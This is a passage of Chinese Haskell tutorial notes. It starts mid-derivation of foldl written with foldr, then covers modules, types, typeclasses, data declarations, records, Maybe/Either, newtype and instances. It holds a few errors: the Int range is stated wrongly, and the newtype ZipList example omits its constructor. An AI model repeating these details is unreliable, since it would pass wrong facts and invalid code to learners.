\u5e26\u5165\u8ba1\u7b97\u4e00\u4e0b\uff1a xs \u5373\u4e3a [x1..xn]\uff0c\u4e3a\u4e86\u65b9\u4fbf\uff0c\u7528 xs' \u6765\u8868\u793a [x2..xn]\uff0c\u7528 xs'' \u6765\u8868\u793a [x3..xn] \u5b9a\u4e49\u4e2d\u7684 f \u5373\u4e3a (\\x g y -> g (f y x))\uff0ca \u5373\u4e3a id foldr ( \\ x g y -> g ( f y x )) id xs z = ( \\ x g y -> g ( f y x )) x1 ( foldr ( ... ) id xs' ) z \u5199\u5b8c\u7b2c\u4e00\u6b65\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0cx1 (foldr (...) id xs') z \u6b63\u597d\u5206\u522b\u5bf9\u5e94\u4e86 lambda \u8868\u8fbe\u5f0f\u4e2d\u7684 x\u3001g\u3001y\u3002\u53ef\u4ee5\u5c06\u5176\u5e94\u7528\uff0c\u8fdb\u4e00\u6b65\u5c55\u5f00\uff1a ( \\ x g y -> g ( f y x )) x1 ( foldr ( ... ) id xs' ) z = ( foldr ( ... ) id xs' ) ( f z x1 ) \u4e0d\u96be\u53d1\u73b0\uff0c\u539f\u5f0f (foldr (...) id xs) z \u7b49\u4ef7\u4e8e\uff1a (foldr (...) id xs') (f z x1) \u8ddf\u7740\u8fd9\u4e2a\u601d\u8def\uff0cxs \u6bcf\u6b21\u5c11\u4e00\u4e2a\u5f00\u5934\u7684\u5143\u7d20 x'\uff0cz \u6bcf\u6b21\u53d8\u6362\u6210\u4e3a f z x' \u56e0\u6b64\u4e0b\u4e00\u6b65\uff1a ( \\ x g y -> g ( f y x )) x1 ( foldr ( ... ) id xs' ) z = ( foldr ( ... ) id xs' ) ( f z x1 ) = ( foldr ( ... ) id xs'' ) ( f ( f z x1 ) x2 ) = ( foldr ( ... ) id xs''' ) ( f ( f ( f z x1 ) x2 ) x3 ) = ... \u53ef\u4ee5\u53d1\u73b0\uff0c\u5df2\u7ecf\u6709\u4e86\u89c4\u5f8b\u3002\u90a3\u4e48\u6700\u7ec8\u505c\u6b62\u65f6\u662f\u4ec0\u4e48\u6837\u5462\uff1f \u6700\u540e\u5230\u4e86\u4e0d\u80fd\u5728\u5c55\u5f00\u65f6\uff0c\u6700\u524d\u9762\u7684 foldr (...) id xs \u5df2\u7ecf\u53d8\u6210\u4e86 foldr (...) id [] \u800c\u6839\u636e\u524d\u9762 foldr \u7684\u5b9a\u4e49 foldr _ x [] = x \uff0c\u5b83\u5e94\u8be5\u8fd4\u56de id \u6240\u4ee5\u6700\u540e\u7684\u7ed3\u679c\uff1a (id \u7684\u5b9a\u4e49\uff1aid x = x) ... = ( foldr ( ... ) id xs' ) ( f z x1 ) = ( foldr ( ... ) id xs'' ) ( f ( f z x1 ) x2 ) = ... = ( foldr ( ... ) id [] ) ( f ( .. ( f z x1 ) .. ) xn ) = id ( f ( .. ( f z x1 ) .. ) xn ) = f ( .. ( f z x1 ) .. ) xn \u90a3\u4e48\u6700\u540e\u8fd9\u4e2a\u7ed3\u679c\u5c31\u5f88\u719f\u6089\u4e86\uff0c\u5b83\u5c31\u662f foldl f z xs\u3002 \u6240\u4ee5\u6211\u4eec\u63a8\u5bfc\u51fa\u4e86\u8fd9\u4e2a\u7528 foldr \u8868\u793a foldl \u7684\u5199\u6cd5\u662f\u6b63\u786e\u7684\u3002 Modules \u00b6 Haskell \u4f1a\u81ea\u52a8\u52a0\u8f7d Prelude \u6a21\u5757\uff08module\uff09\uff0c\u5982\u679c\u5728 GHCi \u4e2d\u518d\u52a0\u8f7d\u5176\u4ed6\u6a21\u5757\uff0c\u9700\u8981\u4f7f\u7528 :m + ... \uff0c\u6bd4\u5982\u52a0\u8f7d Data.List \u6a21\u5757\uff1a Prelude> :m + Data.List \u800c\u5728 hs \u6587\u4ef6\u4e2d\u5f15\u5165\u6a21\u5757\uff0c\u9700\u8981\u4f7f\u7528 import \u8bed\u53e5\uff0c\u4e0b\u9762\u548c python \u7684\u5bf9\u6bd4\u53ef\u4ee5\u4fbf\u4e8e\u7406\u89e3\uff1a import Data.List -- from Data.List import * import Data.List ( nub , sort ) -- from Data.List import nub, sort import Data.List hiding ( nub ) -- \u4eceData.List\u4e2d\u5f15\u5165\u6240\u6709\uff0c\u4f46\u4e0d\u5f15\u5165nub\u51fd\u6570 import qualified Data.List -- import Data.List import qualified Data.List as Li -- import Data.List as Li \u7f16\u5199 Modules \u00b6 \u6a21\u5757\u4e2d\u8981\u5305\u542b\u5c06\u8981\u4f7f\u7528\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u50cf\u6b63\u5e38\u7684 hs \u6587\u4ef6\u4e00\u6837\u5199\u5373\u53ef\uff0c\u4f46\u5934\u90e8\u9700\u8981\u6709\u5bfc\u51fa\u8bed\u53e5\uff08export\uff09\u3002\u6bd4\u5982\u4e00\u4e2a\u6a21\u5757\u6587\u4ef6\u540d\u53eb ModuleA.hs \uff0c\u90a3\u5b83\u7684\u5934\u90e8\u9700\u8981\u5199\uff1a module ModuleA ( functionA , functionB , functionC ) where \u800c\u4e14\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u51fd\u6570\u53ea\u5bfc\u51fa\u9700\u8981\u4f7f\u7528\u7684\u5373\u53ef\u3002\u6bd4\u5982\u8be5\u6587\u4ef6\u4e2d\u8fd8\u542b\u6709 functionD \u4f9b\u524d\u4e09\u4e2a\u51fd\u6570\u5185\u90e8\u4f7f\u7528\uff0c\u90a3\u4e48\u5728 import ModuleA \u4e4b\u540e\u4e5f\u65e0\u6cd5\u8c03\u7528 functionD\u3002 Types & Typeclasses \u00b6 Types \u00b6 Haskell \u6709\u4e00\u4e2a\u9759\u6001\u7c7b\u578b\u7cfb\u7edf\uff0c\u4efb\u4f55\u53d8\u91cf\u3001\u51fd\u6570\u90fd\u4f1a\u5177\u6709\u7c7b\u578b\uff0c\u5e76\u4e14\u6709\u7c7b\u578b\u5224\u65ad\u529f\u80fd\uff0c\u6ca1\u7ed9\u51fa\u7684\u7c7b\u578b\u4f1a\u81ea\u52a8\u8bc6\u522b\u3002 Type \u7684\u9996\u5b57\u6bcd\u5168\u4e3a\u5927\u5199\uff0c\u5e38\u7528\u7684\u6709\uff1a Int \uff1a\u6574\u578b\uff0c\u6709\u4e0a\u4e0b\u754c\u8303\u56f4\uff0c-2147483647\uff5e2147483648 Integer \uff1a\u6574\u6570\uff0c\u65e0\u754c\uff0c\u4f46\u662f\u6548\u7387\u6bd4Int\u4f4e Float \uff1a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b Double \uff1a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b Bool \uff1a\u5e03\u5c14\u503c Char \uff1a\u5b57\u7b26 String \uff1a\u5b57\u7b26\u4e32\uff0c\u7b49\u540c\u4e8e [Char] Ordering \uff1a\u5927\u5c0f\u5173\u7cfb\uff0c\u5305\u542bLT\u3001EQ\u3001GT\uff0c\u4e14\u5b83\u4eec\u6709\u5927\u5c0f\u5173\u7cfb LT < EQ < GT \u5217\u8868\u7684\u7c7b\u578b\u662f\u7531\u5176\u4e2d\u5143\u7d20\u51b3\u5b9a\u7684\uff0c\u5e76\u4e14\u5217\u8868\u4e2d\u5143\u7d20\u5fc5\u987b\u662f\u540c\u4e00\u7c7b\u578b\uff0c\u6240\u4ee5\u5217\u8868\u7684\u7c7b\u578b\u5c31\u662f\u5176\u5143\u7d20\u7c7b\u578b\u5916\u52a0 [] \u3002 \u5143\u7ec4\u7684\u7c7b\u578b\u7531\u5176\u4e2d\u5404\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u5171\u540c\u51b3\u5b9a\uff0c\u56e0\u4e3a\u5143\u7ec4\u4e2d\u7684\u5143\u7d20\u53ef\u4ee5\u662f\u4e0d\u540c\u7c7b\u578b\u3002\u5982 (\"abc\", 'a', True) \u7684\u7c7b\u578b\u662f ([Char], Char, Bool)\u3002 Typeclasses \u00b6 \u7c7b\u578b\u7c7b\uff08Typeclass\uff09\u662f\u5b9a\u4e49\u4e00\u7cfb\u5217\u529f\u80fd\u7684\u63a5\u53e3\uff0c\u5982\u679c\u4e00\u4e2a Type \u5c5e\u4e8e\u4e00\u4e2a Typeclass \u7684\u6210\u5458\uff0c\u90a3\u4e48\u5b83\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e2a\u7c7b\u578b\u7c7b\u6240\u89c4\u5b9a\u7684\u529f\u80fd\u3002\u4e00\u4e2a Type \u4e5f\u53ef\u4ee5\u5c5e\u4e8e\u591a\u4e2aTypeclass Typeclass\u7684\u9996\u5b57\u6bcd\u4e5f\u5168\u4e3a\u5927\u5199\uff0c\u5e38\u89c1\u7684\u6709\uff1a Eq \uff1a\u53ef\u5224\u65ad\u662f\u5426\u76f8\u7b49 Ord \uff1a\u53ef\u6bd4\u8f83\u5927\u5c0f Show \uff1a\u53ef\u5c55\u793a\u6210\u5b57\u7b26\u4e32 Read \uff1a\u53ef\u4ece\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u7279\u5b9a\u7c7b\u578b Enum \uff1a\u53ef\u679a\u4e3e\uff08\u8fde\u7eed\uff09\uff0c\u5373\u53ef\u4ee5\u4f7f\u7528 pred \u548c succ \u51fd\u6570\u5f97\u5230\u524d\u9a71\u548c\u540e\u7f00 Bounded : \u6709\u4e0a\u4e0b\u754c\uff0c\u5982\u679c\u5143\u7ec4\u4e2d\u6240\u6709\u5143\u7d20\u90fd\u5c5e\u4e8e Bounded\uff0c\u90a3\u8fd9\u4e2a\u5143\u7ec4\u7684\u7c7b\u578b\u4e5f\u5c5e\u4e8e Bounded Integral \uff1a\u662f\u6574\u6570\uff0c\u5305\u62ec Int \u548c Integer RealFloat \uff1a \u662f\u5b9e\u6d6e\u70b9\u6570\uff0c\u5305\u62ec Float \u548c Double RealFrac \uff1a\u662f\u5b9e\u5206\u6570\uff0c\u5305\u62ec Float\u3001Double \u548c Ratio\uff08\u5728 Data.Ratio \u6a21\u5757\u4e2d\uff09 Floating \uff1a\u662f\u6d6e\u70b9\u6570\uff0c\u5305\u62ec Float\u3001Double \u548c Complex\uff08\u5728 Data.Complex \u6a21\u5757\u4e2d\uff09 Real \uff1a\u662f\u5b9e\u6570\uff0c\u5305\u62ec Integral \u548c RealFrac \u7684\u6210\u5458 Fractional \uff1a\u662f\u5206\u6570\uff0c\u5305\u62ec RealFrac \u548c Floating \u7684\u6210\u5458 Num \uff1a\u662f\u6570\u5b57\uff0c\u5305\u62ec\u4e0a\u8ff0\u6240\u6709\u6570\u5b57\u76f8\u5173\u7684\u7c7b\u578b Type variables \u00b6 \u5982\u679c\u67e5\u770b\u4e00\u4e2a\u51fd\u6570\u7684\u7c7b\u578b\uff0c\u6bd4\u5982 head \uff0c\u90a3\u4e48\u5c06\u4f1a\u8fd4\u56de\u4ee5\u4e0b\u7c7b\u578b\uff1a head :: [a] -> a \u5176\u4e2d\u7684 a \u5c31\u662f\u4e00\u4e2a\u7c7b\u578b\u53d8\u91cf\uff08type variable\uff09\uff0c\u5b83\u5728 head \u4e2d\u53ef\u4ee5\u5c5e\u4e8e\u4efb\u4f55\u7c7b\u578b\uff0c\u5728\u8fd9\u91cc\u53ea\u662f\u8868\u793a\u8fd4\u56de\u503c\u7684\u7c7b\u578b\u548c\u8f93\u5165\u7684\u5217\u8868\u4e2d\u7684\u5143\u7d20\u7684\u7c7b\u578b\u76f8\u4e00\u81f4\u3002 \u5728\u51fd\u6570\u7684\u7c7b\u578b\u8868\u8fbe\u5f0f\u5176\u5b9e\u53ef\u4ee5\u770b\u4f5c \\(\\lambda\\) \u8868\u8fbe\u5f0f\uff0c\u5b83\u9002\u7528\u4e8e \\(\\alpha\\) \u53d8\u6362\uff08 \\(\\alpha\\) -conversion\uff09\u3002\u5373 a \u5728\u8fd9\u91cc\u53ef\u4ee5\u6307 Int\u3001Char \u7b49\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u6307 [Char], (Int, Char), \u751a\u81f3\u51fd\u6570 Int -> Int \u7b49\u3002 \u5728\u5927\u90e8\u5206\u51fd\u6570\u7684\u7c7b\u578b\u4e2d\uff0c\u7c7b\u578b\u53d8\u91cf\u9700\u8981\u4fdd\u8bc1\u662f\u67d0\u4e2a Typeclass \u7684\u6210\u5458\u624d\u80fd\u5b8c\u6210\u64cd\u4f5c\u3002\u6bd4\u5982 (==) \u51fd\u6570\uff0c\u5b83\u9700\u8981\u4f20\u5165\u7684\u53c2\u6570\u662f\u53ef\u5224\u65ad\u76f8\u7b49\u7684\uff0c\u5373\u662f Eq \u7684\u6210\u5458\uff0c\u90a3\u4e48 (==) \u7684\u7c7b\u578b\u5c31\u662f\uff1a (==) :: (Eq a) => a -> a -> Bool \u5176\u4e2d => \u524d\u7684\u90e8\u5206 (Eq a) \u5c31\u662f\u7c7b\u7ea6\u675f\uff08class constraint\uff09\uff0c\u5b83\u89c4\u5b9a\u4e86 a \u662f Eq \u7684\u6210\u5458\uff0c\u6240\u4ee5 (==) \u51fd\u6570\u4f20\u5165\u7684\u4e24\u4e2a\u53c2\u6570\u90fd\u662f a \u7c7b\u578b\uff0c\u4e14\u90fd\u662f Eq \u7684\u6210\u5458\uff0c\u4fdd\u8bc1\u4e86\u5b83\u4eec\u4e4b\u95f4\u662f\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\u7684\u3002 \u5b9a\u4e49\u65b0 Type \u00b6 \u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684 Type \u9700\u8981\u4f7f\u7528 data \u5173\u952e\u5b57\uff0c\u6bd4\u5982\u5b9a\u4e49 Bool \u9700\u8981\u4f7f\u7528\uff1a data Bool = False | True \u5176\u4e2d = \u5de6\u4fa7\u7684\u90e8\u5206\u5b9a\u4e49\u4e86\u65b0\u7c7b\u578b\u7684\u540d\u79f0 Bool \uff0c\u53f3\u4fa7\u7684\u90e8\u5206\u53eb\u505a\u503c\u6784\u9020\u5668\uff08value constructors\uff09\uff0c\u8868\u793a\u4e86 Bool \u7c7b\u578b\u7684\u503c\u4e3a False \u6216 True\u3002 \u5e76\u4e14\u540d\u79f0\u548c\u503c\u6784\u9020\u5668\u7684\u9996\u5b57\u6bcd\u90fd\u9700\u8981\u5927\u5199\u3002 \u53e6\u5916\uff0c\u503c\u6784\u9020\u5668\u4e5f\u662f\u51fd\u6570\uff0c\u5b83\u4eec\u53ef\u4ee5\u6709\u53c2\u6570\uff0c\u53eb\u505a\u9879\uff08field\uff09\u3002\u6bd4\u5982\uff1a data Shape = Circle Float Float Float | Rectangle Float Float Float Float \u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b0 Type \u53eb Shape\uff0c\u503c\u6784\u9020\u5668\u662f Circle \u548c Rectangle\uff0cCircle \u63a5\u6536\u4e09\u4e2a\u53c2\u6570\u90fd\u662f Float \u7c7b\u578b\uff0cRectangle \u63a5\u6536\u56db\u4e2a Float \u7c7b\u578b\u53c2\u6570\u3002 \u5982\u679c\u67e5\u770b Circle \u7684\u7c7b\u578b\uff0c\u5c06\u8fd4\u56de\uff1a Circle :: Float -> Float -> Float -> Shape \u5982\u679c\u60f3\u8981\u8ba9\u5b83\u80fd\u7ed9\u76f4\u63a5\u663e\u793a\u51fa\u6765\uff0c\u9700\u8981\u8ba9\u5b83\u5c5e\u4e8e Show \u7c7b\u578b\u7c7b\u3002\u5728\u4ee3\u7801\u4e2d\u53ea\u9700\u8981\u5728\u7ed3\u5c3e\u52a0\u4e0a deriving (Show) : data Shape = Circle Float Float Float | Rectangle Float Float Float Float deriving ( Show ) \u7c7b\u578b\u7684\u540d\u79f0\u548c\u503c\u6784\u9020\u5668\u540d\u79f0\u4e5f\u53ef\u4ee5\u76f8\u540c\uff0c\u6bd4\u5982\uff1a data Point = Point Float Float deriving ( Show ) \u5bfc\u51fa Type \u00b6 \u5728\u6587\u4ef6\u4e2d\u5b9a\u4e49\u4e86\u65b0\u7684 Type \u4e4b\u540e\uff0c\u5982\u679c\u5728\u522b\u7684\u6587\u4ef6\u4e2d\u5c06\u5176\u4f5c\u4e3a\u6a21\u5757\u5bfc\u5165\uff0c\u5219\u9700\u8981\u5148\u5bfc\u51fa\u3002\u6bd4\u5982\u6587\u4ef6 Shapes.hs \u4e2d\u5b9a\u4e49\u4e86 Shape \u548c Point\uff0c\u4ee5\u53ca\u5176\u4ed6\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u90a3\u4e48\u6587\u4ef6\u5f00\u5934\u9700\u8981\u5199\uff1a module Shapes ( Shape ( .. ) , Point ( .. ) , functionA , functionB ) where \u5176\u4e2d\u7684 Shape(..) \u5bfc\u51fa\u4e86 Shape \u7c7b\u578b\u548c\u5b83\u6240\u6709\u7684\u503c\u6784\u9020\u5668\uff0c .. \u4ee3\u8868\u4e86\u5b83\u7684\u6240\u6709\u503c\u6784\u9020\u5668\u3002\u56e0\u6b64\uff0c Shape(..) \u76f8\u5f53\u4e8e Shape (Circle, Rectangle) \u3002 \u5982\u679c\u4e0d\u60f3\u8981\u5bfc\u51fa\u503c\u6784\u9020\u5668\uff0c\u5373\u4e0d\u5141\u8bb8\u4f7f\u7528\u503c\u6784\u9020\u5668\u7684\u65b9\u6cd5\u6765\u521b\u5efa Shape \u7c7b\u578b\u7684\u53d8\u91cf\u3002\u90a3\u4e48\u9700\u8981\u5c06 Shape(..) \u66ff\u6362\u4e3a Shape \uff0c\u8fd9\u6837\u5c31\u53ea\u5bfc\u51fa\u4e86 Shape \u7c7b\u578b\uff0c\u800c\u4e0d\u5bfc\u51fa\u5176\u503c\u6784\u9020\u5668\u3002 Record Syntax \u00b6 \u5982\u679c\u60f3\u8981\u65b9\u4fbf\u5730\u53d6\u51fa\u7c7b\u578b\u5b9e\u4f8b\u4e2d\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528 Record \u8bed\u6cd5\uff0c\u5982\uff1a data Point = Point { xcoord :: Float , ycoord :: Float } deriving ( Show ) \u5728\u503c\u6784\u9020\u5668\u7684\u53c2\u6570\u90e8\u5206\u5148\u52a0\u4e00\u4e2a\u5927\u62ec\u53f7\uff0c\u7136\u540e\u6307\u5b9a\u53d6\u51fa\u503c\u7684\u51fd\u6570\u540d\u79f0\uff08xcoord, ycoord\uff09\uff0c\u540e\u9762\u6307\u5b9a\u7c7b\u578b\uff08:: Float\uff09\u3002\u8fd9\u6837 xcoord \u548c ycoord \u5c31\u90fd\u662f\u4e00\u4e2a\u7c7b\u578b\u4e3a Point -> Float \u7684\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u65b9\u6cd5\u6765\u8bbf\u95ee\u503c\uff1a ghci > let point = Point 1.0 2.0 ghci > xcoord point 1.0 ghci > ycoord point 2.0 \u540c\u65f6\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u65b9\u6cd5\u6765\u521b\u5efa\u8fd9\u4e2a point\uff1a point = Point { ycoord = 2.0 , xcoord = 1.0 } Type parameters \u00b6 \u503c\u6784\u9020\u5668\u53ef\u4ee5\u63a5\u6536\u53c2\u6570\uff0c\u7c7b\u578b\u4e5f\u53ef\u4ee5\u63a5\u6536\u53c2\u6570\uff0c\u8fd9\u6837\u5b83\u5c31\u6210\u4e3a\u4e86\u7c7b\u578b\u6784\u9020\u5668\uff08type constructors\uff09\u3002\u5982 Maybe \u7684\u5b9a\u4e49\uff1a data Maybe a = Nothing | Just a \u5b83\u7684\u503c\u662f Nothing \u65f6\uff0c\u7c7b\u578b\u4e3a Maybe a\uff0c\u662f\u591a\u6001\u7684\uff08polymorphic\uff09\u3002 \u5b83\u7684\u503c\u4e0d\u662f Nothing \u65f6\uff0c\u7c7b\u578b\u53d6\u51b3\u4e8e\u503c Just a \u4e2d a \u7684\u7c7b\u578b\uff0c\u53ef\u4ee5\u6784\u9020\u51fa Maybe Int\u3001Maybe [Char] \u7b49\u591a\u79cd\u7c7b\u578b\uff1a Nothing :: Maybe a Just 1 :: Num a => Maybe a Just 'a' :: Maybe Char Just \"abc\" :: Maybe [ Char ] \u53ef\u4ee5\u7528\u8fd9\u79cd\u65b9\u6cd5\u6539\u5199 Point\uff1a data Point x y = Point { xcoord :: x , ycoord :: y } deriving ( Show ) \u4f46\u4f7f\u7528\u7c7b\u578b\u53c2\u6570\uff08type parameters\uff09\u5e76\u4e0d\u662f\u603b\u662f\u65b9\u4fbf\uff0c\u6bd4\u5982\u5728\u58f0\u660e\u51fd\u6570\u7c7b\u578b\u7684\u65f6\u5019\u4e0d\u80fd\u53ea\u4f7f\u7528 Point \u6765\u8868\u793a Point \u7c7b\u578b\uff0c\u800c\u662f\u5fc5\u987b\u5199\u6210 Point Float Float\u3002 \u800c\u4e14\u4e0d\u80fd\u5728\u5b9a\u4e49\u7c7b\u578b\u6784\u9020\u5668\u65f6\u6dfb\u52a0\u7c7b\u7ea6\u675f\uff08class constraint\uff09\uff0c\u4e0d\u7136\u5728\u4e4b\u540e\u58f0\u660e\u51fd\u6570\u7c7b\u578b\u7684\u65f6\u5019\u4e5f\u90fd\u9700\u8981\u6dfb\u52a0\u7c7b\u7ea6\u675f\uff0c\u5982\uff1a data ( Ord k ) => Map k v = ... toList :: ( Ord k ) => Map k a -> [( k , a )] Either \u00b6 Either \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5b83\u6709\u4e24\u4e2a\u503c\u6784\u9020\u5668\uff0c\u5b9a\u4e49\u662f\uff1a data Either a b = Left a | Right b deriving ( Eq , Ord , Read , Show ) \u5982\u679c\u4f7f\u7528\u4e86 Left\uff0c\u90a3\u5b83\u7684 a \u7684\u7c7b\u578b\u5c31\u662f\u5177\u4f53\u7684\uff1b\u5982\u679c\u4f7f\u7528\u4e86 Right\uff0c\u90a3\u5b83\u7684 b \u7684\u7c7b\u578b\u5c31\u662f\u5177\u4f53\u7684\uff1a ghci > Right 20 Right 20 ghci > Left \"w00t\" Left \"w00t\" ghci > : t Right 'a' Right 'a' :: Either a Char ghci > : t Left True Left True :: Either Bool b Either \u53ef\u4ee5\u770b\u4f5c Maybe \u7684\u8865\u5145\uff0c\u6bd4\u5982 Maybe \u5728\u4f7f\u7528\u65f6\uff0c\u51fa\u73b0\u5f02\u5e38\u53ef\u4ee5\u8fd4\u56de Nothing\uff0c\u4f46\u53ea\u662f\u4e00\u4e2a Nothing\uff0c\u4e0d\u5305\u542b\u4efb\u4f55\u4fe1\u606f\uff1b\u4f46 Either \u5305\u542b\u5de6\u503c\u548c\u53f3\u503c\uff0c\u6b63\u5e38\u7ed3\u679c\u8fd4\u56de\u53f3\u503c\uff0c\u800c\u51fa\u73b0\u5f02\u5e38\u5c31\u53ef\u4ee5\u8fd4\u56de\u5305\u542b\u9519\u8bef\u4fe1\u606f\u7684\u5de6\u503c\uff0c\u6bd4\u5982\u5b89\u5168\u9664\u6cd5\uff1a safeDiv :: Int -> Int -> Maybe Int safeDiv _ 0 = Nothing safeDiv x y = Just ( x ` div ` y ) ghci > safeDiv 4 2 Just 2 ghci > safeDiv 1 0 Nothing \u800c\u4f7f\u7528 Either\uff1a safeDiv :: Int -> Int -> Either String Int safeDiv _ 0 = Left \"Divided by zero\" safeDiv x y = Right ( x ` div ` y ) ghci > safeDiv 4 2 Right 2 ghci > safeDiv 1 0 Left \"Divided by zero\" Derived instances \u00b6 \u60f3\u8981\u4f7f\u4e00\u4e2a\u5b9a\u4e49\u7684\u7c7b\u6ee1\u8db3\u67d0\u4e9b Typeclass \u7684\u9700\u6c42\uff0c\u9700\u8981\u4ece\u5176\u6d3e\u751f\uff08derive\uff09\uff0c\u6bd4\u5982\uff1a data Day = Monday | Tuesday | Wednesday | Thursday | Friday | Saturday | Sunday deriving ( Eq , Ord , Show , Read , Bounded , Enum ) \u8fd9\u6837 Day \u7c7b\u578b\u7684\u503c\uff08Monday\uff5eSunday\uff09\u4e4b\u95f4\u5c31\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\uff08\u4ece Eq \u6d3e\u751f\uff09\uff0c\u6bd4\u8f83\u5927\u5c0f\uff08\u4ece Ord \u6d3e\u751f\uff0c\u5de6\u4fa7\u4e3a\u5c0f\uff0c\u53f3\u4fa7\u4e3a\u5927\uff09\uff0c\u663e\u793a\u6210\u5b57\u7b26\u4e32\uff08\u4ece Show \u6d3e\u751f\uff09\uff0c\u4ece\u5b57\u7b26\u4e32\u4e2d\u8bfb\u53d6\uff08\u4ece Read \u6d3e\u751f\uff09\uff0c\u5305\u542b\u8fb9\u754c\uff08\u4ece Bounded \u6d3e\u751f\uff09\uff0c\u53ef\u4ee5\u679a\u4e3e\uff08\u4ece Enum \u6d3e\u751f\uff0c\u6309\u7167\u503c\u6784\u9020\u5668\u4e2d\u7684\u987a\u5e8f\u4f9d\u6b21\u5411\u53f3\uff09 Type synonyms \u00b6 \u4e3a\u4e86\u9605\u8bfb\u65b9\u4fbf\uff0c\u4e66\u5199\u7b80\u4fbf\uff0c\u53ef\u4ee5\u4f7f\u7528 type \u5173\u952e\u5b57\u4e3a\u5df2\u6709\u7c7b\u578b\u521b\u5efa\u522b\u540d\uff08synonyms\uff09\u3002\u6bd4\u5982 String \u7684\u5b9a\u4e49\uff1a type String = [Char] \u5728\u6240\u6709\u9700\u8981\u4f7f\u7528\u5b57\u7b26\u4e32\uff08\u5373 [Char]\uff09\u7684\u5730\u65b9\u90fd\u53ef\u4ee5\u4f7f\u7528 String \u6765\u4ee3\u66ff\uff0c\u5b83\u4eec\u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u53ea\u662f String \u66f4\u7b80\u4fbf\u6613\u8bfb\u3002 \u540c\u65f6\uff0c\u7c7b\u578b\u522b\u540d\u4e5f\u53ef\u4ee5\u63a5\u6536\u7c7b\u578b\u53c2\u6570 newtype keyword \u00b6 \u9664\u4e86 data \u3001 type \u5173\u952e\u5b57\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528 newtype \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684\u7c7b\u578b\uff0c\u6bd4\u5982 Control.Applicative \u6a21\u5757\u4e2d\u7684 ZipList\uff1a newtype ZipList a = { getZipList :: [ a ] } - \u4e0d\u540c\u4e8e type\uff0c\u5b83\u4e0d\u662f\u522b\u540d\uff0c\u53ef\u4ee5\u4f7f\u7528 record \u8bed\u6cd5\u6765\u76f4\u63a5\u5b9a\u4e49\u53d6\u51fa\u503c\u7684\u51fd\u6570 - \u4e0d\u540c\u4e8e data\uff0c\u5b83\u53ea\u80fd\u6709\u4e00\u4e2a\u503c\u6784\u9020\u5668\uff0c\u4f46\u662f\u901f\u5ea6\u8981\u6bd4 data \u5feb\uff0c\u800c\u4e14\u66f4\u52a0\u61d2\u60f0 Recursive data structures \u00b6 \u4e00\u4e2a\u7c7b\u578b\u4e5f\u53ef\u4ee5\u9012\u5f52\u5b9a\u4e49\uff0c\u6bd4\u5982\u4e00\u9897\u4e8c\u53c9\u6811\uff1a data Tree a = EmptyTree | Node a ( Tree a ) ( Tree a ) deriving ( Show , Read , Eq ) \u5b9a\u4e49\u65b0 Typeclass \u00b6 \u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684 Typeclass \u9700\u8981\u4f7f\u7528 class \u5173\u952e\u5b57\uff0c\u4f8b\u5982\u5b9a\u4e49 Eq \u7c7b\u578b\u7c7b\uff1a class Eq a where ( == ) :: a -> a -> Bool ( /= ) :: a -> a -> Bool x == y = not ( x /= y ) x /= y = not ( x == y ) \u5176\u4e2d a \u662f\u4e00\u4e2a\u7c7b\u578b\u53d8\u91cf\uff0c\u524d\u4e24\u884c\u58f0\u660e\u4e86\u9700\u8981\u5b9e\u73b0\u7684\u51fd\u6570\u7684\u540d\u5b57\u53ca\u5176\u7c7b\u578b\uff0c\u540e\u4e24\u884c\u8868\u660e\u4e86\u9700\u8981\u7684\u51fd\u6570\u4e4b\u95f4\u53ef\u4ee5\u76f8\u4e92\u5b9a\u4e49\uff08\u4e0d\u5fc5\u8981\uff09\u3002 \u5305\u542b\u4e86\u540e\u4e24\u884c\u4e4b\u540e\uff0c\u53ea\u5b9a\u4e49 (==) \u51fd\u6570\u6216\u8005 (/=) \u51fd\u6570\u90fd\u53ef\u4ee5\u5b8c\u6210\u5168\u90e8\u5b9a\u4e49\uff0c\u5b83\u4eec\uff08 (==) | (/=) \uff09\u6210\u4e3a\u8fd9\u4e2a\u7c7b\u578b\u7c7b\u7684\u6700\u5c0f\u5b8c\u6574\u5b9a\u4e49\uff08minimal complete definition\uff09 \u67e5\u770b\u4e00\u4e2a\u7c7b\u578b\u7c7b\u7684\u6210\u5458\u9700\u8981\u5b9e\u73b0\u7684\u51fd\u6570\u53ef\u4ee5\u5728 GHCi \u4e2d\u4f7f\u7528 :info \uff1a ghci> :info Eq \u624b\u52a8\u521b\u5efa\u5b9e\u4f8b \u00b6 \u4f7f\u4e00\u4e2a\u7c7b\u578b\u6210\u4e3a\u4e00\u4e2a\u7c7b\u578b\u7c7b\u7684\u5b9e\u4f8b\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 deriving \u6765\u81ea\u52a8\u5b8c\u6210\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 instance \u5173\u952e\u5b57\u6765\u624b\u52a8\u5b8c\u6210\u3002\u6bd4\u5982\u4f7f Point \u6210\u4e3a Show \u7684\u5b9e\u4f8b\uff1a instance Show Point where show ( Point x y ) = \"(\" ++ show x ++ \", \" ++ show y ++ \")\" -- in ghci ghci > Point 1.0 2.0 ( 1.0 , 2.0 ) 